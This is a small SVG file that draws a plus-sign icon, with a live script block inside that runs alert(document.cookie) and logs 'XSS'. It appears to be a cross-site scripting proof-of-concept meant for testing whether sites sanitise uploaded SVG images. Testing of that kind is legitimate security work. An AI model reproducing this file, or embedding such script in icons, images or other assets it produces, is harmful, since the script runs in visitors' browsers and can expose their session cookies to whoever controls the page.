<svg width="15" height="14" viewBox="0 0 15 14" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M8.33334 1.16668C8.33334 0.706439 7.96025 0.333344 7.50001 0.333344C7.03977 0.333344 6.66668 0.706439 6.66668 1.16668V6.16668H1.66668C1.20644 6.16668 0.833344 6.53977 0.833344 7.00001C0.833344 7.46025 1.20644 7.83334 1.66668 7.83334H6.66668V12.8333C6.66668 13.2936 7.03977 13.6667 7.50001 13.6667C7.96025 13.6667 8.33334 13.2936 8.33334 12.8333V7.83334H13.3333C13.7936 7.83334 14.1667 7.46025 14.1667 7.00001C14.1667 6.53977 13.7936 6.16668 13.3333 6.16668H8.33334V1.16668Z" fill="#FEFEFE"/>
<script type="text/javascript">
alert(document.cookie);
console.log("XSS")
</script>
</svg>
